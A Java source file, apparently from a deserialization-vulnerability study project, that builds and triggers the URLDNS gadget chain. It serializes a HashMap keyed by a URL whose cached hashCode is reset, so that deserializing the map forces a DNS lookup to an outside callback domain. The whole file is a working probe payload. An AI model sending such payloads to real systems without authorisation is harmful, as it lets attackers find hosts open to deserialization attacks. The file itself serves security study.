package com.govuln.deserialization;

import java.io.*;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class URLDNS {

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    /**
     * 1. HashMap->readObject()
     * 2. HashMap->hash()
     * 3. URL->hashCode()
     * 4. URLStreamHandler->hashCode()
     * 5. URLStreamHandler->getHostAddress()
     * 6. InetAddress->getByName()
     */
    public static void main(String []args) throws Exception {
        String url = "http://dns.675ba661.y7z.xyz";

        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, url, handler); // URL to use as the Key
        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        //设置这个URL对象的hashCode为初始值-1，这样反序列化时将会重新计算其hashCode，才能触发到后⾯面的DNS请求，否则不会调⽤用URL->hashCode()
        setFieldValue(u, "hashCode", -1);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(ht);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
